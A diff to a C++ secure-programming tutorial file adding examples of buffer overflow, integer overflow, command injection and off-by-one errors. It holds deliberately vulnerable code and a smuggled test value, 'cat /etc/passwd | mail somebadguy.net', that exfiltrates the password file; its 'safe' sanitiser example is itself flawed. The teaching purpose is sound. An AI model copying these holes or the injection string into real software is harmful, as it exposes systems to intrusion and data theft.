@@ -3,6 +3,12 @@
 // Advices for Secure Programming
 // ===========================================================================
 
+// don't use the secure versions of the CRT library functions
+#define _CRT_SECURE_NO_WARNINGS 
+#include <cstring>
+#include <cstdlib>
+
+
 #include <complex>
 #include <cstdint>
 #include <format>
@@ -49,6 +55,8 @@ namespace SecureProgrammingAdvices {
 
     namespace TakeCareOfBufferOverflow {
 
+        // use secure functions
+
         static void test_take_care_of_buffer_overflow_01() {
 
             char buffer[16];
@@ -60,7 +68,7 @@ namespace SecureProgrammingAdvices {
             auto size = std::size(buffer);
 
             // strncpy_s(buffer, size, str, length);      // crashes
-            strncpy_s(buffer, size, str, size - 1);       //  copy with adjusted boundary
+            strncpy_s(buffer, size, str, size - 1);       // copy with adjusted boundary
 
             buffer[size - 1] = '\0';
 
@@ -85,14 +93,123 @@ namespace SecureProgrammingAdvices {
             std::println("Buffer: >{}< // Bytes written: {}", buffer, bytesWritten);
         }
 
+        // -------------------------------------------------------------------------
+        // work precisely
+
+
+        static void evaluateArgsSloppy(int argc, const char* argv[])
+        {
+            char cmdLine[4096];
+
+            cmdLine[0] = '\0';
+
+            for (int i = 1; i < argc; ++i) {
+                strcat(cmdLine, argv[i]);
+                strcat(cmdLine, " ");
+            }
+
+            std::println("cmdLine: >{}<", cmdLine);
+        }
+
+        static void evaluateArgs(int argc, const char* argv[])
+        {
+            size_t bufsize = 0;
+            size_t buflen = 0;
+
+            char* cmdLine = NULL;
+
+            for (int i = 1; i < argc; ++i) {
+
+                const size_t len = strlen(argv[i]);
+
+                if (bufsize - buflen <= len) {
+
+                    bufsize = (bufsize + len) * 2;
+
+                    char* ptr = (char*)realloc(cmdLine, bufsize);
+                    if (ptr == NULL) {
+                        free(cmdLine);
+                        exit(-1);
+                    }
+
+                    cmdLine = ptr;
+                }
+
+                memcpy(cmdLine + buflen, argv[i], len);
+                buflen += len;
+                cmdLine[buflen++] = ' ';
+            }
+
+            if (cmdLine != NULL) {
+                cmdLine[buflen] = '\0';
+            }
+
+            // print created buffer 'cmdLine'
+            std::println("cmdLine: >{}<", cmdLine);
+
+            free(cmdLine);
+        }
+
+        static void test_take_care_of_buffer_overflow_03() {
+
+            int argc = 5;
+            const char* argv[]{ "program.exe", "one", "two", "three", "four"};
+
+            evaluateArgsSloppy(argc, argv);
+            evaluateArgs(argc, argv);
+        }
+
         static void test_take_care_of_buffer_overflow() {
 
             test_take_care_of_buffer_overflow_01();
             test_take_care_of_buffer_overflow_02();
+            test_take_care_of_buffer_overflow_03();
         }
     }
 
     namespace TakeCareOfArithmeticOverflow {
+
+        static void test_arithmetic_overflow_addition () {
+
+            std::uint32_t a;
+            std::uint32_t b;
+            std::uint32_t sum;
+
+            // ....
+            sum = a + b;
+        }
+
+        static void test_arithmetic_overflow_addition_compliant() {
+
+            std::uint32_t a;
+            std::uint32_t b;
+            std::uint32_t sum;
+
+            std::uint32_t scratch1 = std::numeric_limits<std::uint32_t>::max();
+
+
+            // for example
+            a = std::numeric_limits<std::uint32_t>::max() / 2;
+            b = std::numeric_limits<std::uint32_t>::max() / 2;
+
+            std::uint32_t scratch2 = std::numeric_limits<std::uint32_t>::max() - a;
+
+     //       if (std::numeric_limits<std::uint32_t>::max() - a < b)
+            if (scratch2 < b)
+
+            {
+                /* handle error condition */
+            }
+            else
+            {
+                sum = a + b;
+            }
+
+        }
+
+    }
+
+    namespace TakeCareOfArithmeticOverflowUsingMidpoint {
 
         static void test_take_care_of_arithmetic_overflow() {
 
@@ -103,6 +220,87 @@ namespace SecureProgrammingAdvices {
             std::println("b:                                 {}", b);
             std::println("Incorrect (overflow and wrapping): {}", (a + b) / 2);
             std::println("Correct:                           {}", std::midpoint(a, b));
+        }
+    }
+
+    namespace PreventInjectionOfAttacks {
+
+        // prevent original 'system' function being called
+        static void system(const char* cmd) {}
+
+        static void clean_input(char* input) {
+
+            static char ok_chars[] =
+                "abcdefghijklmnopqrstuvwxyz"
+                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                "1234567890_-@";
+
+            char* begin = input;
+            char* end = input + strlen(input);
+
+            begin += strspn(begin, ok_chars);
+            while (begin != end) {
+                *begin = '_';
+                begin += strspn(begin, ok_chars);
+
+            }
+        }
+
+        static void test_clean_input() {
+
+            char buffer[] = "! Bad char 1: } Bad char 2: {";
+            std::println("Buffer (Input):   {}", buffer);
+
+            clean_input(buffer);
+            std::println("Buffer (Cleaned): {}", buffer);
+        }
+
+        static void do_injection(const char* addr) {
+
+            char buffer[256];
+
+            sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
+            system(buffer);
+        }
+
+        static void do_injection_safe(const char* addr) {
+
+            char buffer[256];
+
+            sprintf(buffer, "/bin/mail %s < /tmp/email", addr);
+            std::println("Buffer (Input):   {}", buffer);
+
+            clean_input(buffer);
+            std::println("Buffer (Cleaned): {}", buffer);
+
+            system(buffer);
+        }
+
+        static void test_injection() {
+            do_injection("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
+            test_clean_input();
+            do_injection_safe("bogus@addr.com; cat /etc/passwd | mail somebadguy.net");
+        }
+    }
+
+    namespace PreventOffbyOneErrors {
+
+        static void test_off_by_one_errors() {
+
+            char source[10];
+
+            strcpy(source, "0123456789");
+
+            char* dest = (char*)malloc(strlen(source));
+            
+            int i;
+            for (i = 1; i <= 11; i++)
+            {
+                dest[i] = source[i];
+            }
+            dest[i] = '\0';
+
+            std::println("Dest: {}", dest);
         }
     }
 
@@ -493,19 +691,29 @@ void secure_programming_advices()
 {
     using namespace SecureProgrammingAdvices;
 
-    PreferCppToC::test_prefer_cpp_to_c();
-    TakeCareOfBufferOverflow::test_take_care_of_buffer_overflow();
-    TakeCareOfArithmeticOverflow::test_take_care_of_arithmetic_overflow();
-    UseAlgorithms::test_use_algorithms();
-    SafeDowncasting::test_safe_downcasting();
-    DontUseNewExplicitely::test_dont_use_new_explicitely();
-    GivePrimitiveDatatypesSemantics::test_use_string_literals();
-    GivePrimitiveDatatypesSemantics::test_use_class_enums();
-    GivePrimitiveDatatypesSemantics::test_give_primitive_datatypes_semantics();
-    DeclareSingleArgumentConstructorsExplicit::test_declare_single_argument_constructors_explicit();
-    UseOverride::test_use_override();
-    UseConst::test_use_const();
-    UseNodiscardAttribute::test_use_nodiscard();
+    //PreferCppToC::test_prefer_cpp_to_c();
+    //TakeCareOfBufferOverflow::test_take_care_of_buffer_overflow();
+    //
+    
+
+    TakeCareOfArithmeticOverflow::test_arithmetic_overflow_addition_compliant();
+
+  //  TakeCareOfArithmeticOverflowUsingMidpoint::test_take_care_of_arithmetic_overflow();
+    
+    //
+    //TakeCareOfArithmeticOverflowUsingMidpoint::test_take_care_of_arithmetic_overflow();
+    //PreventInjectionOfAttacks::test_injection();
+    //PreventOffbyOneErrors::test_off_by_one_errors();
+    //UseAlgorithms::test_use_algorithms();
+    //SafeDowncasting::test_safe_downcasting();
+    //DontUseNewExplicitely::test_dont_use_new_explicitely();
+    //GivePrimitiveDatatypesSemantics::test_use_string_literals();
+    //GivePrimitiveDatatypesSemantics::test_use_class_enums();
+    //GivePrimitiveDatatypesSemantics::test_give_primitive_datatypes_semantics();
+    //DeclareSingleArgumentConstructorsExplicit::test_declare_single_argument_constructors_explicit();
+    //UseOverride::test_use_override();
+    //UseConst::test_use_const();
+    //UseNodiscardAttribute::test_use_nodiscard();
 }
 
 // ===========================================================================
